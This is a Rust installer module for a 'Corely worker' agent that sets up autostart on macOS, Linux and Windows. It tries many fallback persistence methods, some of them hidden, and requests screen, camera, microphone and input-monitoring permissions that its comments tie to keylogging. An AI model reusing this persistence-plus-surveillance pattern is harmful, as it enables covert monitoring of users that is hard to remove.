use anyhow::{anyhow, Result};
use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use tracing::{info, warn};

/// Install the worker as a system service with multiple fallback strategies
pub fn install(server_url: &str, token: &str) -> Result<()> {
    let exe_path = env::current_exe()?;

    #[cfg(target_os = "macos")]
    {
        macos_install(&exe_path, server_url, token)?;
    }

    #[cfg(target_os = "linux")]
    {
        linux_install(&exe_path, server_url, token)?;
    }

    #[cfg(target_os = "windows")]
    {
        windows_install(&exe_path, server_url, token)?;
    }

    Ok(())
}

// ============================================================================
// macOS Installation
// ============================================================================

#[cfg(target_os = "macos")]
fn macos_install(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    info!("Installing on macOS...");

    // Request permissions first
    macos_request_permissions()?;

    // Try multiple autostart strategies
    let strategies: Vec<(&str, fn(&PathBuf, &str, &str) -> Result<()>)> = vec![
        ("LaunchAgent (User)", macos_launch_agent_user),
        ("LaunchDaemon (System)", macos_launch_daemon),
        ("Login Items", macos_login_items),
        ("Cron @reboot", macos_cron_reboot),
    ];

    let mut success = false;
    for (name, strategy) in strategies {
        info!("Trying autostart strategy: {}", name);
        match strategy(exe_path, server_url, token) {
            Ok(()) => {
                info!("Successfully installed via: {}", name);
                success = true;
                break;
            }
            Err(e) => {
                warn!("Strategy '{}' failed: {}", name, e);
            }
        }
    }

    if !success {
        return Err(anyhow!("All autostart strategies failed"));
    }

    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_request_permissions() -> Result<()> {
    info!("Requesting macOS permissions...");

    // Screen Recording permission - trigger by attempting capture
    info!("Requesting Screen Recording permission...");
    let _ = Command::new("screencapture")
        .args(["-x", "-t", "png", "/tmp/corely_permission_check.png"])
        .output();
    let _ = fs::remove_file("/tmp/corely_permission_check.png");

    // Accessibility permission - needed for input simulation and keylogging
    info!("Requesting Accessibility permission...");
    // This will prompt the user via system dialog
    let script = r#"
    tell application "System Events"
        keystroke ""
    end tell
    "#;
    let _ = Command::new("osascript").args(["-e", script]).output();

    // Camera permission
    info!("Requesting Camera permission...");
    let script = r#"
    use framework "AVFoundation"
    current application's AVCaptureDevice's requestAccessForMediaType:"vide" completionHandler:(missing value)
    "#;
    let _ = Command::new("osascript").args(["-l", "AppleScript", "-e", script]).output();

    // Microphone permission (for future audio capture)
    info!("Requesting Microphone permission...");
    let script = r#"
    use framework "AVFoundation"
    current application's AVCaptureDevice's requestAccessForMediaType:"soun" completionHandler:(missing value)
    "#;
    let _ = Command::new("osascript").args(["-l", "AppleScript", "-e", script]).output();

    // Input Monitoring permission - for keylogger
    info!("Requesting Input Monitoring permission...");
    // Attempting to use CGEventTap will trigger the permission request
    let _ = Command::new("osascript")
        .args(["-e", r#"tell application "System Preferences" to reveal anchor "Privacy_ListenEvent" of pane id "com.apple.preference.security""#])
        .output();

    info!("Permission requests sent. User may need to grant permissions in System Settings > Privacy & Security");

    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_launch_agent_user(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let launch_agents = home.join("Library/LaunchAgents");
    fs::create_dir_all(&launch_agents)?;

    let plist_path = launch_agents.join("com.corely.worker.plist");
    let log_path = home.join("Library/Logs/corely-worker.log");

    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.corely.worker</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
        <string>--server</string>
        <string>{}</string>
        <string>--token</string>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{}</string>
    <key>StandardErrorPath</key>
    <string>{}</string>
</dict>
</plist>"#,
        exe_path.display(),
        server_url,
        token,
        log_path.display(),
        log_path.display()
    );

    fs::write(&plist_path, plist_content)?;

    // Load the launch agent
    Command::new("launchctl")
        .args(["load", "-w", plist_path.to_str().unwrap()])
        .output()?;

    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_launch_daemon(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let plist_path = PathBuf::from("/Library/LaunchDaemons/com.corely.worker.plist");
    let log_path = PathBuf::from("/var/log/corely-worker.log");

    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.corely.worker</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
        <string>--server</string>
        <string>{}</string>
        <string>--token</string>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{}</string>
    <key>StandardErrorPath</key>
    <string>{}</string>
</dict>
</plist>"#,
        exe_path.display(),
        server_url,
        token,
        log_path.display(),
        log_path.display()
    );

    // This requires sudo
    fs::write(&plist_path, plist_content)?;

    Command::new("sudo")
        .args(["launchctl", "load", "-w", plist_path.to_str().unwrap()])
        .output()?;

    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_login_items(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    // Create a wrapper script that the login item will run
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let script_path = home.join(".corely/start.sh");
    fs::create_dir_all(script_path.parent().unwrap())?;

    let script_content = format!(
        r#"#!/bin/bash
"{}" --server "{}" --token "{}" &
"#,
        exe_path.display(),
        server_url,
        token
    );
    fs::write(&script_path, &script_content)?;

    // Make executable
    Command::new("chmod")
        .args(["+x", script_path.to_str().unwrap()])
        .output()?;

    // Add to Login Items using AppleScript
    let applescript = format!(
        r#"tell application "System Events"
    make login item at end with properties {{path:"{}", hidden:true}}
end tell"#,
        script_path.display()
    );

    Command::new("osascript")
        .args(["-e", &applescript])
        .output()?;

    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_cron_reboot(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let cron_entry = format!(
        "@reboot {} --server {} --token {}\n",
        exe_path.display(),
        server_url,
        token
    );

    // Get existing crontab
    let output = Command::new("crontab").arg("-l").output();
    let existing = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => String::new(),
    };

    // Add our entry if not already present
    if !existing.contains("corely") {
        let new_crontab = format!("{}{}", existing, cron_entry);
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()?;

        if let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            stdin.write_all(new_crontab.as_bytes())?;
        }
        child.wait()?;
    }

    Ok(())
}

// ============================================================================
// Linux Installation
// ============================================================================

#[cfg(target_os = "linux")]
fn linux_install(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    info!("Installing on Linux...");

    let strategies: Vec<(&str, fn(&PathBuf, &str, &str) -> Result<()>)> = vec![
        ("systemd user service", linux_systemd_user),
        ("systemd system service", linux_systemd_system),
        ("XDG autostart", linux_xdg_autostart),
        ("cron @reboot", linux_cron_reboot),
        ("init.d script", linux_initd),
        (".profile", linux_profile),
    ];

    let mut success = false;
    for (name, strategy) in strategies {
        info!("Trying autostart strategy: {}", name);
        match strategy(exe_path, server_url, token) {
            Ok(()) => {
                info!("Successfully installed via: {}", name);
                success = true;
                break;
            }
            Err(e) => {
                warn!("Strategy '{}' failed: {}", name, e);
            }
        }
    }

    if !success {
        return Err(anyhow!("All autostart strategies failed"));
    }

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_systemd_user(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let service_dir = home.join(".config/systemd/user");
    fs::create_dir_all(&service_dir)?;

    let service_path = service_dir.join("corely-worker.service");
    let service_content = format!(
        r#"[Unit]
Description=Corely Worker Agent
After=network.target

[Service]
Type=simple
ExecStart={} --server {} --token {}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"#,
        exe_path.display(),
        server_url,
        token
    );

    fs::write(&service_path, service_content)?;

    Command::new("systemctl")
        .args(["--user", "daemon-reload"])
        .output()?;
    Command::new("systemctl")
        .args(["--user", "enable", "corely-worker.service"])
        .output()?;
    Command::new("systemctl")
        .args(["--user", "start", "corely-worker.service"])
        .output()?;

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_systemd_system(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let service_path = PathBuf::from("/etc/systemd/system/corely-worker.service");
    let user = env::var("USER").unwrap_or_else(|_| "root".to_string());

    let service_content = format!(
        r#"[Unit]
Description=Corely Worker Agent
After=network.target

[Service]
Type=simple
User={}
ExecStart={} --server {} --token {}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"#,
        user,
        exe_path.display(),
        server_url,
        token
    );

    fs::write(&service_path, service_content)?;

    Command::new("sudo")
        .args(["systemctl", "daemon-reload"])
        .output()?;
    Command::new("sudo")
        .args(["systemctl", "enable", "corely-worker.service"])
        .output()?;
    Command::new("sudo")
        .args(["systemctl", "start", "corely-worker.service"])
        .output()?;

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_xdg_autostart(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let autostart_dir = home.join(".config/autostart");
    fs::create_dir_all(&autostart_dir)?;

    let desktop_path = autostart_dir.join("corely-worker.desktop");
    let desktop_content = format!(
        r#"[Desktop Entry]
Type=Application
Name=Corely Worker
Exec={} --server {} --token {}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"#,
        exe_path.display(),
        server_url,
        token
    );

    fs::write(&desktop_path, desktop_content)?;

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_cron_reboot(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let cron_entry = format!(
        "@reboot {} --server {} --token {}\n",
        exe_path.display(),
        server_url,
        token
    );

    let output = Command::new("crontab").arg("-l").output();
    let existing = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => String::new(),
    };

    if !existing.contains("corely") {
        let new_crontab = format!("{}{}", existing, cron_entry);
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()?;

        if let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            stdin.write_all(new_crontab.as_bytes())?;
        }
        child.wait()?;
    }

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_initd(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let script_path = PathBuf::from("/etc/init.d/corely-worker");
    let user = env::var("USER").unwrap_or_else(|_| "root".to_string());

    let script_content = format!(
        r#"#!/bin/sh
### BEGIN INIT INFO
# Provides:          corely-worker
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       Corely Worker Agent
### END INIT INFO

case "$1" in
  start)
    su - {} -c "{} --server {} --token {} &"
    ;;
  stop)
    pkill -f corely-worker
    ;;
  *)
    echo "Usage: $0 {{start|stop}}"
    exit 1
esac
"#,
        user,
        exe_path.display(),
        server_url,
        token
    );

    fs::write(&script_path, script_content)?;
    Command::new("chmod")
        .args(["+x", script_path.to_str().unwrap()])
        .output()?;
    Command::new("update-rc.d")
        .args(["corely-worker", "defaults"])
        .output()?;

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_profile(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let profile_path = home.join(".profile");

    let startup_line = format!(
        "\n# Corely Worker\npgrep -f corely-worker || {} --server {} --token {} &\n",
        exe_path.display(),
        server_url,
        token
    );

    let existing = fs::read_to_string(&profile_path).unwrap_or_default();
    if !existing.contains("corely") {
        fs::write(&profile_path, format!("{}{}", existing, startup_line))?;
    }

    Ok(())
}

// ============================================================================
// Windows Installation
// ============================================================================

#[cfg(target_os = "windows")]
fn windows_install(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    info!("Installing on Windows...");

    let strategies: Vec<(&str, fn(&PathBuf, &str, &str) -> Result<()>)> = vec![
        ("Registry Run key (HKCU)", windows_registry_hkcu),
        ("Registry Run key (HKLM)", windows_registry_hklm),
        ("Startup folder", windows_startup_folder),
        ("Task Scheduler", windows_task_scheduler),
        ("Windows Service", windows_service),
    ];

    let mut success = false;
    for (name, strategy) in strategies {
        info!("Trying autostart strategy: {}", name);
        match strategy(exe_path, server_url, token) {
            Ok(()) => {
                info!("Successfully installed via: {}", name);
                success = true;
                break;
            }
            Err(e) => {
                warn!("Strategy '{}' failed: {}", name, e);
            }
        }
    }

    if !success {
        return Err(anyhow!("All autostart strategies failed"));
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_registry_hkcu(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    let command = format!(
        "\"{}\" --server \"{}\" --token \"{}\"",
        exe_path.display(),
        server_url,
        token
    );

    key.set_value("CorelyWorker", &command)?;

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_registry_hklm(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let (key, _) = hklm.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    let command = format!(
        "\"{}\" --server \"{}\" --token \"{}\"",
        exe_path.display(),
        server_url,
        token
    );

    key.set_value("CorelyWorker", &command)?;

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_startup_folder(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;
    let startup_folder = home.join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    // Create a batch file in the startup folder
    let batch_path = startup_folder.join("corely-worker.bat");
    let batch_content = format!(
        "@echo off\nstart \"\" \"{}\" --server \"{}\" --token \"{}\"\n",
        exe_path.display(),
        server_url,
        token
    );

    fs::write(&batch_path, batch_content)?;

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_task_scheduler(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    let command = format!(
        "\"{}\" --server \"{}\" --token \"{}\"",
        exe_path.display(),
        server_url,
        token
    );

    // Create a scheduled task that runs at logon
    Command::new("schtasks")
        .args([
            "/Create",
            "/SC", "ONLOGON",
            "/TN", "CorelyWorker",
            "/TR", &command,
            "/RL", "HIGHEST",
            "/F",
        ])
        .output()?;

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_service(exe_path: &PathBuf, server_url: &str, token: &str) -> Result<()> {
    // Create the service using sc.exe
    let bin_path = format!(
        "\"{}\" --server \"{}\" --token \"{}\"",
        exe_path.display(),
        server_url,
        token
    );

    Command::new("sc")
        .args([
            "create", "CorelyWorker",
            "binPath=", &bin_path,
            "start=", "auto",
            "DisplayName=", "Corely Worker Agent",
        ])
        .output()?;

    Command::new("sc")
        .args(["start", "CorelyWorker"])
        .output()?;

    Ok(())
}

// ============================================================================
// Uninstall
// ============================================================================

/// Uninstall the worker completely
pub fn uninstall() -> Result<()> {
    info!("Uninstalling Corely worker...");

    #[cfg(target_os = "macos")]
    {
        macos_uninstall()?;
    }

    #[cfg(target_os = "linux")]
    {
        linux_uninstall()?;
    }

    #[cfg(target_os = "windows")]
    {
        windows_uninstall()?;
    }

    info!("Corely worker uninstalled successfully");
    Ok(())
}

#[cfg(target_os = "macos")]
fn macos_uninstall() -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;

    // Stop and remove LaunchAgent
    let plist_user = home.join("Library/LaunchAgents/com.corely.worker.plist");
    if plist_user.exists() {
        let _ = Command::new("launchctl")
            .args(["unload", "-w", plist_user.to_str().unwrap()])
            .output();
        let _ = fs::remove_file(&plist_user);
        info!("Removed LaunchAgent");
    }

    // Try to stop and remove LaunchDaemon (requires sudo)
    let plist_system = PathBuf::from("/Library/LaunchDaemons/com.corely.worker.plist");
    if plist_system.exists() {
        let _ = Command::new("sudo")
            .args(["launchctl", "unload", "-w", plist_system.to_str().unwrap()])
            .output();
        let _ = Command::new("sudo")
            .args(["rm", plist_system.to_str().unwrap()])
            .output();
        info!("Removed LaunchDaemon");
    }

    // Remove from Login Items
    let applescript = r#"tell application "System Events"
    delete login item "start.sh"
end tell"#;
    let _ = Command::new("osascript").args(["-e", applescript]).output();

    // Remove cron entry
    if let Ok(output) = Command::new("crontab").arg("-l").output() {
        let existing = String::from_utf8_lossy(&output.stdout);
        let filtered: String = existing
            .lines()
            .filter(|line| !line.contains("corely"))
            .collect::<Vec<_>>()
            .join("\n");
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()?;
        if let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            let _ = stdin.write_all(filtered.as_bytes());
        }
        let _ = child.wait();
        info!("Removed cron entry");
    }

    // Remove config and scripts
    let corely_dir = home.join(".corely");
    if corely_dir.exists() {
        let _ = fs::remove_dir_all(&corely_dir);
        info!("Removed ~/.corely directory");
    }

    let config_dir = home.join(".config/corely");
    if config_dir.exists() {
        let _ = fs::remove_dir_all(&config_dir);
        info!("Removed config directory");
    }

    // Remove log file
    let log_file = home.join("Library/Logs/corely-worker.log");
    let _ = fs::remove_file(&log_file);

    // Remove binary from .local/bin
    let local_bin = home.join(".local/bin");
    let _ = fs::remove_file(local_bin.join("corely-worker"));
    let _ = fs::remove_file(local_bin.join("corely"));

    // Kill any running processes
    let _ = Command::new("pkill").args(["-f", "corely-worker"]).output();

    Ok(())
}

#[cfg(target_os = "linux")]
fn linux_uninstall() -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("Cannot find home directory"))?;

    // Stop and disable systemd user service
    let _ = Command::new("systemctl")
        .args(["--user", "stop", "corely-worker.service"])
        .output();
    let _ = Command::new("systemctl")
        .args(["--user", "disable", "corely-worker.service"])
        .output();
    let service_user = home.join(".config/systemd/user/corely-worker.service");
    let _ = fs::remove_file(&service_user);
    let _ = Command::new("systemctl").args(["--user", "daemon-reload"]).output();
    info!("Removed systemd user service");

    // Stop and disable systemd system service (requires sudo)
    let _ = Command::new("sudo")
        .args(["systemctl", "stop", "corely-worker.service"])
        .output();
    let _ = Command::new("sudo")
        .args(["systemctl", "disable", "corely-worker.service"])
        .output();
    let _ = Command::new("sudo")
        .args(["rm", "/etc/systemd/system/corely-worker.service"])
        .output();
    let _ = Command::new("sudo")
        .args(["systemctl", "daemon-reload"])
        .output();

    // Remove XDG autostart
    let autostart = home.join(".config/autostart/corely-worker.desktop");
    let _ = fs::remove_file(&autostart);
    info!("Removed XDG autostart");

    // Remove cron entry
    if let Ok(output) = Command::new("crontab").arg("-l").output() {
        let existing = String::from_utf8_lossy(&output.stdout);
        let filtered: String = existing
            .lines()
            .filter(|line| !line.contains("corely"))
            .collect::<Vec<_>>()
            .join("\n");
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()?;
        if let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            let _ = stdin.write_all(filtered.as_bytes());
        }
        let _ = child.wait();
        info!("Removed cron entry");
    }

    // Remove init.d script
    let _ = Command::new("sudo")
        .args(["update-rc.d", "-f", "corely-worker", "remove"])
        .output();
    let _ = Command::new("sudo")
        .args(["rm", "/etc/init.d/corely-worker"])
        .output();

    // Remove from .profile
    let profile_path = home.join(".profile");
    if profile_path.exists() {
        if let Ok(content) = fs::read_to_string(&profile_path) {
            let filtered: String = content
                .lines()
                .filter(|line| !line.contains("corely"))
                .collect::<Vec<_>>()
                .join("\n");
            let _ = fs::write(&profile_path, filtered);
        }
    }

    // Remove config directory
    let config_dir = home.join(".config/corely");
    if config_dir.exists() {
        let _ = fs::remove_dir_all(&config_dir);
        info!("Removed config directory");
    }

    // Remove binary from .local/bin
    let local_bin = home.join(".local/bin");
    let _ = fs::remove_file(local_bin.join("corely-worker"));
    let _ = fs::remove_file(local_bin.join("corely"));

    // Kill any running processes
    let _ = Command::new("pkill").args(["-f", "corely-worker"]).output();

    Ok(())
}

#[cfg(target_os = "windows")]
fn windows_uninstall() -> Result<()> {
    // Stop and delete Windows service
    let _ = Command::new("sc").args(["stop", "CorelyWorker"]).output();
    let _ = Command::new("sc").args(["delete", "CorelyWorker"]).output();
    info!("Removed Windows service");

    // Delete scheduled task
    let _ = Command::new("schtasks")
        .args(["/Delete", "/TN", "CorelyWorker", "/F"])
        .output();
    info!("Removed scheduled task");

    // Remove from registry
    let _ = Command::new("reg")
        .args(["delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "CorelyWorker", "/f"])
        .output();
    let _ = Command::new("reg")
        .args(["delete", r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "CorelyWorker", "/f"])
        .output();
    info!("Removed registry entries");

    // Remove from startup folder
    if let Some(home) = dirs::home_dir() {
        let startup_bat = home.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\corely-worker.bat");
        let _ = fs::remove_file(&startup_bat);

        // Remove config directory
        let config_dir = home.join(r"AppData\Roaming\Corely");
        if config_dir.exists() {
            let _ = fs::remove_dir_all(&config_dir);
        }
    }

    // Kill any running processes
    let _ = Command::new("taskkill")
        .args(["/F", "/IM", "corely-worker.exe"])
        .output();

    Ok(())
}
